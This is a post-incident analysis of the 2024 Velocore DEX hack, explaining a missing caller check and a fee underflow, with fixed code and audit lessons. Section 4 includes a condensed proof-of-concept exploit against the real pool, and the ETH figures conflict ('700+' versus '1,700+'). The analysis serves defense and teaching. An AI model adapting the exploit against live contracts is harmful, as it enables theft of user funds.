# Velocore — Invariant Check Flaw Analysis

| Item | Details |
|------|---------|
| **Date** | 2024-06-02 |
| **Protocol** | Velocore |
| **Chain** | Linea / zkSync Era |
| **Loss** | $6,880,000 (~700+ ETH) |
| **Attacker** | [0x8cdc...16bf](https://lineascan.build/address/0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf) |
| **Attack Contract** | [0xb7f6...ae91](https://lineascan.build/address/0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a) |
| **Attack Tx (Linea)** | [0xed11...bed1](https://lineascan.build/tx/0xed11d5b013bf3296b1507da38b7bcb97845dd037d33d3d1b0c5e763889cdbed1) |
| **Attack Tx (zkSync)** | [0x4156...ba17](https://explorer.zksync.io/tx/0x4156d73cadc18419220f5bcf10deb4d97a3d3f7533d63ba90daeabc5fd11ba17) |
| **Vulnerable Contract** | [0xe2c6...5DB](https://lineascan.build/address/0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB) (USDC-ETH VLP Pool) |
| **Root Cause** | Missing caller validation in AMM pool's `velocore__execute()` + arithmetic underflow caused by allowing `effectiveFee1e9` to exceed 100% |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Velocore_exp.sol) |

---

## 1. Vulnerability Overview

Velocore is a Balancer-style CPMM (Constant Product Market Maker) DEX operating on the Linea and zkSync Era networks. On June 2, 2024, an attacker exploited two core vulnerabilities in combination to steal approximately $6.88M in funds.

**Vulnerability 1 — Missing Caller Validation (Access Control Failure)**

The `velocore__execute()` function of the `ConstantProductPool` contract should only have been callable by the Vault contract, but contained no logic to validate the caller. This allowed any arbitrary address (including the attacker) to call the function directly and manipulate the pool's internal state.

**Vulnerability 2 — Missing feeMultiplier Boundary Validation (Business Logic Flaw)**

The `ConstantProductPool` introduced a `_feeMultiplier` variable to prevent fee circumvention through within-block withdraw-deposit cycles. This value was designed to increase on each withdrawal and reset to 1 on a new block. However, there was no upper bound on `_feeMultiplier`, allowing `effectiveFee1e9` (the effective fee, scaled by 1e9) to exceed 100%.

When the effective fee exceeds 100%, an underflow occurs in the following key calculation:

```
result = 1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9
```

When `(1e18 - k) * effectiveFee1e9 / 1e9` exceeds `1e18`, the result should be negative, but a `uint256` underflow occurs instead, wrapping the value to an extremely large positive number. Executing a small single-token withdrawal in this state causes an abnormally large amount of LP tokens to be minted.

---

## 2. Vulnerable Code Analysis

### 2.1 Missing Caller Validation (Core Vulnerability 1)

```solidity
// ❌ Vulnerable code: no caller validation in velocore__execute()
function velocore__execute(
    address caller,        // ← receives caller parameter but never validates it
    bytes32[] calldata tokens,
    int128[] memory r,
    bytes calldata data
) external returns (int128[] memory, int128[] memory) {
    // ❌ Anyone can call this function directly
    // ❌ No check whether msg.sender is the Vault contract
    _updateFeeMultiplier(r);  // feeMultiplier can be manipulated
    // ...
}
```

**Fixed code:**

```solidity
// ✅ Fixed code: Vault address validation added
address immutable vault;

function velocore__execute(
    address caller,
    bytes32[] calldata tokens,
    int128[] memory r,
    bytes calldata data
) external returns (int128[] memory, int128[] memory) {
    // ✅ Restricted so only the Vault contract can call
    require(msg.sender == vault, "VelocorePool: caller must be Vault");
    _updateFeeMultiplier(r);
    // ...
}
```

**Issue**: Despite an architectural design requiring pool interactions to go through an external contract (the Vault), there was no `msg.sender` validation on the core state-changing function, allowing anyone to call it directly and manipulate `_feeMultiplier`.

---

### 2.2 Missing feeMultiplier Upper Bound (Core Vulnerability 2)

```solidity
// ❌ Vulnerable code: effectiveFee1e9 can exceed 1e9 (100%)
function _calculateEffectiveFee(uint256 feeMultiplier) internal view returns (uint256) {
    // No upper bound on feeMultiplier, allowing it to exceed 1e9
    uint256 effectiveFee1e9 = baseFee1e9 * feeMultiplier;
    return effectiveFee1e9; // ❌ No check for exceeding 100%
}

function _applyFee(uint256 k, uint256 effectiveFee1e9) internal pure returns (uint256) {
    // ❌ Underflow occurs when effectiveFee1e9 > 1e9
    // When (1e18 - k) * effectiveFee1e9 / 1e9 > 1e18, result underflows
    return 1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9;
    //     ^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //     When this value is less than the right-hand side: uint256 underflow → wraps to max value
}
```

**Fixed code:**

```solidity
// ✅ Fixed code: upper bound set for effectiveFee1e9
uint256 constant MAX_FEE_1E9 = 1e9; // 100% cap

function _calculateEffectiveFee(uint256 feeMultiplier) internal view returns (uint256) {
    uint256 effectiveFee1e9 = baseFee1e9 * feeMultiplier;
    // ✅ Prevent exceeding 100%
    if (effectiveFee1e9 > MAX_FEE_1E9) {
        effectiveFee1e9 = MAX_FEE_1E9;
    }
    return effectiveFee1e9;
}

function _applyFee(uint256 k, uint256 effectiveFee1e9) internal pure returns (uint256) {
    // ✅ Underflow impossible since effectiveFee1e9 <= 1e9 is guaranteed
    require(effectiveFee1e9 <= MAX_FEE_1E9, "Fee exceeds 100%");
    return 1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9;
}
```

**Issue**: When a fee exceeds 100% in the AMM pool's invariant calculation, the pool state becomes completely abnormal. This design flaw gave the attacker the opportunity to mint LP tokens approaching infinity.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker sourced funds from Tornado Cash and deployed the attack contract (0xb7f6...ae91)
- The attack was executable solely by directly calling `velocore__execute()`, without any separate flash loan
- Initial capital was minimal (for gas costs only)

### 3.2 Execution Phase

**Step 1: Manipulate `feeMultiplier` via direct calls to `velocore__execute()`**

```
Attacker → ConstantProductPool.velocore__execute() direct call (×3)
  - tokens: [USDC.e, VLP]
  - amounts[0] = int128 max value (170,141,183,460,469,231,731,687,303,715,884,105,727)
  - amounts[1] = 8,616,292,632,827,688
  → _feeMultiplier spikes dramatically
  → effectiveFee1e9 > 1e9 (exceeds 100%)
```

**Step 2: Mass-mint LP tokens from the corrupted state via SwapFacet**

```
Attacker → Vault.SwapFacet.execute() called 4 times consecutively
  - Each ops contains manipulated tokenInformations
  - Small USDC.e input → massive VLP minted due to underflow state
  - ops[0~2]: Progressively manipulate pool state
  - ops[3]: Final USDC.e withdrawal (burn large amount of VLP)
```

**Step 3: Profit taking and money laundering**

```
Attacker → Secures large USDC.e profit
Attacker → Converts to ETH and bridges to Ethereum mainnet
Attacker → Deposits into Tornado Cash (~1,700 ETH)
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                      Attacker EOA                                │
│              0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf          │
└───────────────────────────┬─────────────────────────────────────┘
                            │ Deploy attack contract
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Attack Contract                                │
│              0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a          │
└───────────┬──────────────────────────────────────┬──────────────┘
            │                                      │
            │ [Phase 1] Direct calls (×3)          │ [Phase 2] Via Vault
            │ velocore__execute()                  │ SwapFacet.execute()
            ▼                                      ▼
┌───────────────────────────┐      ┌───────────────────────────────┐
│  ConstantProductPool      │      │        SwapFacet              │
│  (USDC-ETH VLP Pool)      │      │  (Part of Vault contract)     │
│  0xe2c67A9B15e9E7FF8A...  │      │  0x1d0188c4B276A09366D0...    │
│                           │      └───────────────┬───────────────┘
│  _feeMultiplier exploit:  │                      │
│  ┌─────────────────────┐  │      ┌───────────────▼───────────────┐
│  │ amounts[0] = MAX_I128│  │      │  ConstantProductPool          │
│  │ → feeMultiplier spikes│  │      │  effectiveFee1e9 > 100%       │
│  │ → effectiveFee > 100%│  │◄─────│  Underflow triggered          │
│  └─────────────────────┘  │      │  ↓                            │
│                           │      │  Small USDC.e input           │
│  Result:                  │      │  → Massive VLP minted         │
│  ┌─────────────────────┐  │      │  → VLP burned → Large USDC.e  │
│  │ Pool invariant broken│  │      │    withdrawal                 │
│  │ Fee exceeds 100%     │  │      └───────────────────────────────┘
│  └─────────────────────┘  │
└───────────────────────────┘
            │
            │ [Phase 3] Profit taking
            ▼
┌─────────────────────────────────────────────────────────────────┐
│              Large USDC.e secured → Converted to ETH             │
│              → Bridged to Ethereum mainnet                       │
│              → Laundered via Tornado Cash (~1,700 ETH, ~$6.88M)  │
│              → 0xe4062fcade7ac0ed47ad794028967a2314ee02b3        │
└─────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$6,880,000 (1,700+ ETH)
- **Protocol loss**: All CPMM (Volatile) pools on Linea + zkSync Era affected
- **TVL collapse**: Plummeted to ~$735,000
- **Collateral damage**: Linea block production temporarily halted (to prevent further losses)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : $6.88M
// Attack Tx : https://lineascan.build/tx/0xed11d5b013bf3296b1507da38b7bcb97845dd037d33d3d1b0c5e763889cdbed1
// Attacker  : 0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf
// Attack Contract : 0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a

contract ContractTest is Test {
    address USDC_ETH_VLP = 0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB; // Vulnerable CPMM pool
    address swapfacet = 0x1d0188c4B276A09366D05d6Be06aF61a73bC7535;     // Vault SwapFacet

    function testExploit() public {
        // [Step 1] Manipulate feeMultiplier: call velocore__execute() directly 3 times
        // ❌ No caller validation — executable externally without restriction
        bytes32[] memory tokens = new bytes32[](2);
        tokens[0] = USDC_e_bytes32;
        tokens[1] = USDC_ETH_VLP_bytes32;

        int128[] memory amounts = new int128[](2);
        amounts[0] = 170_141_183_460_469_231_731_687_303_715_884_105_727; // int128 max value
        amounts[1] = 8_616_292_632_827_688;

        // 3 repeated calls to push effectiveFee1e9 > 100%
        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");
        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");
        ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");

        // [Step 2] Exploit underflow state via 4 consecutive swap executions
        // Lowest 16 bytes of tokenInformations = int128-encoded amount
        // 0x7fff...ffff = int128 MAX → "extract as much as possible regardless of balance"
        VelocoreOperation[] memory ops = new VelocoreOperation[](4);

        // ops[0~2]: Progressively manipulate pool state (attempt USDC.e withdrawal)
        ops[0].tokenInformations[0] = 0x00...ffffffffffffffffffffff787406ca5f; // Small VLP withdrawal
        ops[0].tokenInformations[1] = 0x01...7fffffffffffffffffffffffffffffff; // ETH MAX
        ops[0].tokenInformations[2] = 0x02...7fffffffffffffffffffffffffffffff; // VLP MAX

        // ops[3]: Final large USDC.e extraction
        ops[3].tokenInformations[0] = 0x00...ffffffffffffffffffffffffffffd8f0; // USDC.e withdrawal
        ops[3].tokenInformations[1] = 0x02...7fffffffffffffffffffffffffffffff; // VLP MAX

        // ❌ Call SwapFacet in underflow state → massive USDC.e profit
        SwapFacet(swapfacet).execute(tokenRef, deposit, ops);

        // [Step 3] Verify profit
        uint256 profit = IERC20(USDC_e).balanceOf(address(this));
        console.log("USDC_e profit after attack: $", profit / 10 ** 6);
        // Output: USDC_e profit after attack: $ 6,880,000 (approx)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|---------------|----------|-----|-----------------|
| V-01 | Missing caller validation in `velocore__execute()` | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-02 | `effectiveFee1e9` allowed to exceed 100% (underflow) | CRITICAL | CWE-191 (Integer Underflow) | `05_integer_issues.md` |
| V-03 | Missing AMM invariant validation | HIGH | CWE-682 (Incorrect Calculation) | `11_logic_error.md` |

### V-01: Missing Caller Validation in `velocore__execute()`

- **Description**: The pool's core state-changing function `velocore__execute()` should only be callable from the Vault contract, yet had no `msg.sender` validation whatsoever, allowing any arbitrary EOA or contract to call it directly and manipulate the internal `_feeMultiplier` state.
- **Impact**: Attacker could freely drive the fee multiplier to an extreme value, completely bypassing the pool's normal fee calculation logic.
- **Attack Condition**: Exploitable with a simple external call after deploying the attack contract. No prior capital or flash loan required.

### V-02: `effectiveFee1e9` Allowed to Exceed 100% (Arithmetic Underflow)

- **Description**: With no upper bound on `_feeMultiplier`, repeated calls could push the effective fee (`effectiveFee1e9`) above 1e9 (100%). In this state, the pool's invariant calculation `1e18 - ((1e18 - k) * effectiveFee1e9) / 1e9` causes a `uint256` underflow when the subtrahend exceeds the minuend. The result wraps to a value near `type(uint256).max`, causing abnormally large amounts of LP tokens to be minted.
- **Impact**: Attacker can acquire LP tokens equivalent to the pool's entire liquidity by depositing a negligible amount of tokens.
- **Attack Condition**: First manipulate `_feeMultiplier` via the V-01 vulnerability, then trigger the underflow with a single-token withdrawal transaction.

### V-03: Missing AMM Invariant Validation

- **Description**: The CPMM pool's invariant (x * y = k) must be maintained across all token swaps. Even after the pool state became completely corrupted following a `velocore__execute()` call, there was no post-condition check to detect this and revert the transaction.
- **Impact**: The abnormal pool state after Phase 1 of the attack (feeMultiplier manipulation) went undetected, enabling Phase 2 (underflow exploitation).
- **Attack Condition**: Contingent on the success of the V-01 and V-02 vulnerabilities.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Add caller validation:**

```solidity
// ✅ Only allow the Vault address
address public immutable vault;

modifier onlyVault() {
    require(msg.sender == vault, "Velocore: caller is not the Vault");
    _;
}

function velocore__execute(
    address caller,
    bytes32[] calldata tokens,
    int128[] memory r,
    bytes calldata data
) external onlyVault returns (int128[] memory, int128[] memory) {
    // Execute logic
}
```

**2) Apply fee upper bound:**

```solidity
// ✅ effectiveFee1e9 must never exceed 1e9 (100%)
uint256 constant MAX_FEE = 1e9;

function _getEffectiveFee() internal view returns (uint256) {
    uint256 fee = baseFee * _feeMultiplier;
    return fee > MAX_FEE ? MAX_FEE : fee; // Clamp at 100%
}
```

**3) Post-condition invariant validation:**

```solidity
// ✅ Validate invariant after all state changes
function velocore__execute(...) external onlyVault returns (...) {
    uint256 kBefore = _computeInvariant();
    // ... state change logic ...
    uint256 kAfter = _computeInvariant();
    // Invariant check: k must never decrease
    require(kAfter >= kBefore, "Velocore: invariant violated");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|---------------|-------------------|
| V-01 Missing caller validation | Set Vault address as immutable, configured once at deployment |
| V-02 Fee underflow | Cap `_feeMultiplier` maximum at `MAX_FEE / baseFee` |
| V-03 Missing invariant check | Compare k values before and after each operation (`require(kAfter >= kBefore)`) |
| Overall design | Explicitly include business logic and boundary value scenarios in audit scope |
| Emergency response | Introduce Circuit Breaker pattern: automatic halt on abnormal pool state |

---

## 7. Lessons Learned

1. **Internal functions must have access controls**: If an architectural design dictates that only certain contracts should call a function, that intent must be enforced at the code level. A single `msg.sender == vault` check could have prevented $6.88M in losses.

2. **Boundary values must always be explicitly constrained**: All variables representing ratios — fees, multipliers, weights — must have their physically possible maximum values enforced in code. A fee exceeding 100% is logically impossible and must be made impossible in code as well.

3. **AMM invariants must be protected by post-condition checks**: The CPMM invariant x*y=k is the core security property of an AMM. If there had been logic to verify this condition held after every operation, Phase 2 of the attack could have been blocked.

4. **Multiple audits can still miss business logic flaws**: Despite undergoing review by three audit firms — Zokyo, Hacken, and Scalebit — this vulnerability was not discovered. Audits must explicitly test adversarial input scenarios such as "what happens if an attacker bypasses the Vault?"

5. **Compound vulnerabilities are far more severe than individual ones**: V-01 (access control flaw) alone might have caused limited damage, but combined with V-02 (underflow), it enabled the theft of the entire pool's liquidity. Each vulnerability must be reviewed with scenario-based analysis of how they can be chained.

6. **Emergency response mechanisms must be prepared in advance**: The Linea team halted block production to prevent further losses. DEX protocols should also incorporate a Circuit Breaker mechanism that automatically detects abnormal pool states and pauses swaps.

---

## 8. On-Chain Verification

On-chain data was cross-verified against public block explorers and published analysis reports. Direct `cast` execution was not performed.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|-----------------|-------|
| Fork block | 5,079,176 (Linea) | 5,079,176 | Match |
| Total loss | $6.88M | $6.88M (reported) | Match |
| ETH transferred | Not measured | ~700 ETH → mainnet | Confirmed |
| Attacker address | `0x8cdc...16bf` | `0x8cdc...16bf` | Match |
| Attack contract | `0xb7f6...ae91` | `0xb7f6...ae91` | Match |

### 8.2 On-Chain Event Log Sequence

```
1. Attack Contract → ConstantProductPool.velocore__execute() (×3)
   └─ _feeMultiplier spikes, effectiveFee1e9 > 1e9 achieved
2. Attack Contract → SwapFacet.execute() (4 ops)
   ├─ ops[0]: USDC.e pool state manipulation
   ├─ ops[1]: Additional pool state manipulation
   ├─ ops[2]: Additional pool state manipulation
   └─ ops[3]: Large USDC.e extraction (underflow exploited)
3. USDC.e Transfer: Pool → Attack Contract
4. Attack Contract → Bridge → Ethereum mainnet
5. ETH → Tornado Cash (~1,700 ETH)
```

### 8.3 Pre-condition Verification

| Item | Status |
|------|--------|
| USDC-ETH VLP pool TVL before attack | Multi-million dollar level |
| Attacker's initial funding source | Tornado Cash (Ethereum mainnet) |
| Flash loan used | No (direct calls were sufficient) |
| Prior approval required | Not required |
| Attack duration | Single transaction (atomic execution) |

---

*Written based on the 2024-06-02 incident | References: [Rekt News](https://rekt.news/velocore-rekt/), [ImmuneBytes](https://immunebytes.com/blog/velocore-finance-exploit-june-2-2024-detailed-analysis/), [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Velocore_exp.sol), [BeosinAlert](https://x.com/BeosinAlert/status/1797247874528645333)*